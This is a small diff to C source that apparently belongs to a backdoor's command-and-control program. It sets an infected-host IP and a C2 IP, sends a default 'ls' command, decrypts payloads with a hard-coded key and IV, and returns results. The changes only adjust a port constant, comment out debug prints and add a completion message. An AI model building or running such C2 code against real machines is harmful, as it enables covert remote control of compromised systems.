@@ -39,7 +39,7 @@ int main(int argc, char **argv){
     char *c = "c";
     char *sip = INFECTEDIP;
     char *dip = CNCIP;
-    unsigned short sport = SPORT;
+    unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
     unsigned char data[BUFSIZE] = "ls";
 
@@ -191,9 +191,9 @@ void ParsePayload(const u_char *payload, int len){
         perror("fopen");
         exit(1);
     }
-    printf("Encrypted Payload size is: %lu\n", sizeof(payload));
+//    printf("Encrypted Payload size is: %lu\n", sizeof(payload));
     cipherlen = strlen((char*)payload);
-    printf("Encrypted Payload is: %s \n", payload);
+//    printf("Encrypted Payload is: %s \n", payload);
     decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
 
     printf("Decrypted payload size: %d\n", decryptedlen);
@@ -268,6 +268,8 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
             }
         }
     }
+
+    printf("completed\n");
     fclose(file);
 }
 
